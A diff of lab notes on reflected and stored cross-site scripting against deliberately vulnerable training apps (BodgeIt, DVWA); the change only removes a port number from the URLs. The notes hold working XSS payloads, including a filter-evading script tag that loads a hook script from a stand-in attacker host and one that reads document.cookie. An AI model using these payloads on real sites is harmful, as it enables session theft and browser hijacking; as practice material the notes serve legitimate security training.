@@ -9,9 +9,9 @@ Or run Chrome/Chromium with `--disable-xss-auditor`
 
 ### BodgeIt store
 
-`http://bodgeit.lab:8080/bodgeit/search.jsp?q=%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E`
+`http://bodgeit.lab/bodgeit/search.jsp?q=%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E`
 
-`http://bodgeit.lab:8080/bodgeit/search.jsp?q=<sCrIpt src='http://evil.lab:3000/hook.js'></ScRipT>`
+`http://bodgeit.lab/bodgeit/search.jsp?q=<sCrIpt src='http://evil.lab:3000/hook.js'></ScRipT>`
 
 
 ### DVWA
@@ -27,16 +27,16 @@ GET `http://dvwa.lab/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Da
 ## Stored
 
 
-[BodgeIt / registration](http://bodgeit.lab:8080/bodgeit/register.jsp)
+[BodgeIt / registration](http://bodgeit.lab/bodgeit/register.jsp)
 
 `hacker@citadelo.com<scriPt>alert("XSS");</scRipt>`
 
 trigger it 
 
-`http://bodgeit.lab:8080/bodgeit/admin.jsp`
+`http://bodgeit.lab/bodgeit/admin.jsp`
 
 
-[BodgeIt / Contact](http://bodgeit.lab:8080/bodgeit/contact.jsp)
+[BodgeIt / Contact](http://bodgeit.lab/bodgeit/contact.jsp)
 
 `<sCriPt>alert(document.cookie);</scRipT>`
 
